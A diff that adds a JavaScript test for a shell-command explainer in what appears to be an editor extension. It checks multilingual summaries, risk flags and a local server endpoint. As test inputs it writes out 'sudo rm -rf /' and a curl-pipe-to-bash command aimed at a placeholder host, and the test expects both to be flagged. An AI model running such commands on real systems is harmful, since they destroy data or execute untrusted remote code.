@@ -170,3 +170,30 @@ test("chat card feed: webview origins only, answers once the check lands", async
     server.close();
   }
 });
+
+test("explain: breaks a command into parts in the asked language, unknown parts stay unknown", async () => {
+  const { explain, LANGS } = require("../src/explain");
+  const de = explain("sudo rm -rf / && echo done", "de");
+  assert.deepStrictEqual(de.parts.map((p) => p.text), ["sudo", "rm", "-rf", "/", "&&", "echo", "done"]);
+  assert.ok(de.summary[0].startsWith("Als Administrator (root): löscht Dateien"));
+  assert.ok(de.parts.find((p) => p.text === "/").risky);
+  assert.strictEqual(de.summary.length, 2);
+  const pipe = explain("curl -s https://x.example | bash", "en");
+  assert.strictEqual(pipe.warnings.length, 1);
+  assert.match(explain("frobnicate --x", "en").summary[0], /not in the dictionary/);
+  assert.strictEqual(explain("ls", "xx").lang, "en");
+  for (const [code] of LANGS) assert.ok(explain("git push --force", code).summary[0].length > 10);
+
+  const chatcard = require("../src/chatcard");
+  const { server, port } = await chatcard.startCardServer({ port: 0, getHistory: () => [], waitMs: 100 });
+  try {
+    const body = await new Promise((resolve, reject) => {
+      http.get({ host: "127.0.0.1", port, path: "/explain?cmd=git%20status&lang=fr", headers: { Origin: "vscode-webview://a" } }, (res) => {
+        let d = ""; res.on("data", (c) => (d += c)); res.on("end", () => resolve(d));
+      }).on("error", reject);
+    });
+    assert.strictEqual(JSON.parse(body).lang, "fr");
+  } finally {
+    server.close();
+  }
+});
